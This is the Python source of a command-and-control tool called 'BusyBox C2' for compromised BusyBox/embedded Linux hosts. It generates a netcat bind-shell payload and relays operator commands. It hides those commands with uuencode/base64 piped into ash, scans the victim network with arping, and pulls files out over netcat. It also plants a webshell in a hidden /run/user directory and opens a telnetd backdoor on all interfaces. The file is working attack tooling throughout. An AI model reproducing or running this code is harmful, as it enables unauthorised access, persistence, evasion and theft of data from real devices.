from pyfiglet import Figlet
import socket, select, sys, time
import subprocess
import os
import random
import threading
import re

class BusyBoxC2:
    def __init__(self, server_ip, server_port):

        # Init app variables
        self.server_ip = server_ip
        self.server_port = server_port
        self.prompt = " (busybox-c2)> "
        self.options = []

        # Show banner
        self._show_banner()

        # Show payload to send
        payload = "busybox nc -lp " + str(server_port) + " -e ash"
        print(f"[*] Payload to execute: {payload}\n")

        # Init socket
        self.socket = self._init_socket()

    def _show_banner(self):
        print(Figlet(font="slant").renderText("BusyBox C2"))

    def _init_socket(self):
        print(f"[...] Initialization of TCP connection to {self.server_ip}:{self.server_port}")
        while True:
            try:
                self.socket = socket.create_connection((self.server_ip, self.server_port))
                print("[+] New connection !\n")
                break
            except KeyboardInterrupt:
                exit(0)
            except:
                pass

        self.socket.setblocking(False)
        return self.socket

    def _send_cmd(self, cmd, output=True):

        # Furtive option (execute only without)
        if "furtive" in self.options :
            self.socket.sendall((cmd + "\n").encode())
            return

        # Add marker to know when command execution is terminated
        marker = "M{}".format(int(time.time()*1000))
        full_cmd = cmd + " ; echo " + marker

        # Obfuscate full cmd if necessary
        if "obfuscation_ascii" in self.options:
            full_cmd = self._cmd_obfuscation_ascii(full_cmd)
            print(f"Executed command: {full_cmd}\n")
        if "obfuscation_base64" in self.options:
            full_cmd = self._cmd_obfuscation_b64(full_cmd)
            print(f"Executed command: {full_cmd}\n")

        # Send payload and wait marker in response to stop reading socket
        self.socket.sendall((full_cmd + "\n").encode())
        buf = bytearray()
        printed = 0
        marker_b = marker.encode()
        while True:
            r, _, _ = select.select([self.socket], [], [], 0.5)
            if r:
                try:
                    chunk = self.socket.recv(4096)
                except BlockingIOError:
                    continue
                if not chunk:
                    if printed < len(buf) and output==True:
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                buf.extend(chunk)
                idx = buf.find(marker_b)
                if idx != -1:
                    if printed < idx and output==True:
                        sys.stdout.write(buf[printed:idx].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                else:
                    if len(buf) > printed and output==True:
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                        printed = len(buf)
            else:
                continue

    def _cmd_obfuscation_b64(self, raw_cmd):
        cmd_to_get_cmd_b64_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode -m - | sed -n "2p"'
        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_b64_version, shell=True, text=True)
        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin-base64 644 -\\n%s\\n`\\n====\\n' $s|busybox uudecode |ash"
        return payload
    
    def _cmd_obfuscation_ascii(self, raw_cmd):
        cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
        payload = "s=\"" + self.sanitize_ash_var(ascii_cmd) + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode|ash"
        return payload
    
    def sanitize_ash_var(self, variable):
        sanitize_variable = variable.rstrip("\n")
        return re.sub(r'([`"\\$])', r'\\\1', sanitize_variable)

    def _discover_arp_scan(self):
        net_ip = input("Network IP (ex: 192.168.1.0): ")
        range = input("Range (max: 254): ")

        cmd = "for i in $(seq 1 " + range + "); do sudo arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"

        print("[*] Start scanning...")
        self._send_cmd(cmd)
        print("[*] Scan ended")

    def _download(self):
        file_name = input("File to download: ")
        listening_port = random.randint(1024, 65534)
        listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name

        # Send command to get the file with a delay to wait server availability
        cmd = "sleep 0.5; nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
        t = threading.Thread(target=self._send_cmd, args=(cmd,))
        t.start()

        # Launch listener to receive file
        os.system(listener_cmd)

        return listening_port, t
    
    def _upload(self, file=0, destination_path="./"):
        if file==0: file = input("File to upload: ")

        file_path = os.path.dirname(file) + "/"
        file_name = os.path.basename(file)

        listening_port = random.randint(1024, 65534)
        remote_cmd = "nc -lp " + str(listening_port) + " > " + destination_path + file_name
        t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
        t.start()
        local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + file_path + file_name
        os.system(local_cmd)

    
    def _install_webshell(self):

        # Webshell destination path
        webshell_destination_path = "/run/user/$(id -u)/.http/"

        # Create web directory on agent
        cmd = "mkdir -p " + webshell_destination_path
        self._send_cmd(cmd)

        # Upload archive with ressources
        self._upload("ressources/webshell.tar.gz", webshell_destination_path)

        # Extract archive on agent
        cmd = "cd " + webshell_destination_path + " && tar xzf webshell.tar.gz" + " && rm " + "webshell.tar.gz && cd -"
        print("Executed cmd:" + cmd)
        self._send_cmd(cmd)
    
        # Run webserver (cmd: "httpd -p 8080 -c /run/user/$(id -u)/.http/httpd.conf -h /run/user/$(id -u)/.http/")
        webserver_port = random.randint(1024, 65534)
        cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
        self._send_cmd(cmd)
        print(f"[*] Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")

    def _load_prompt(self):
        agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
        agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
        agent_pwd = self._send_cmd("echo $PWD", output=False)[0].decode().split("\n", 1)[0]

        self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "

    def _telnet_backdoor(self):
        listening_port = random.randint(1024, 65534)
        cmd = "telnetd -b 0.0.0.0:" + str(listening_port) + " -l ash"
        self._send_cmd(cmd)
        print(f"[*] Your telnet backdoor is ready on telnet://{self.server_ip}:{listening_port}")

    def run(self):
        try:
            while True:
                try:
                    cmd = input(self.prompt)

                    match cmd.strip().lower():
                        case 'exit' | '/exit':
                            break
                        case '/options_disable' | '/o_d':
                            self.options.clear()
                            self.prompt = " (busybox-c2)> "
                        case '/options_show' | '/o_s' | '/options' | '/o':
                            for option in self.options:
                                print(f"{option} ")
                        case '/obfuscation_ascii' | '/obf_a':
                            self.options.append('obfuscation_ascii')
                            self.prompt = " (busybox-c2)[+]> "
                        case '/obfuscation_base64' | '/obf_b64':
                            self.options.append('obfuscation_base64')
                            self.prompt = " (busybox-c2)[+]> "
                        case '/scan_discover':
                            self._discover_arp_scan()
                        case '/download':
                            self._download()
                        case '/upload':
                            self._upload()
                        case '/install_webshell':
                            # work only without obfuscation
                            self._install_webshell()
                        case '/telnet_backdoor':
                            self._telnet_backdoor()
                        case '/load_prompt':
                            self.options.append('load_prompt')
                            self._load_prompt()
                        case '/furtive':
                            self.options.append('furtive')
                            if "load_prompt" in self.options: self.options.remove("load_prompt")
                        case _:
                            self._send_cmd(cmd)
                            if "load_prompt" in self.options: self._load_prompt()
                except (EOFError, KeyboardInterrupt):
                    break
                if not cmd:
                    continue
        finally:
            self.socket.close()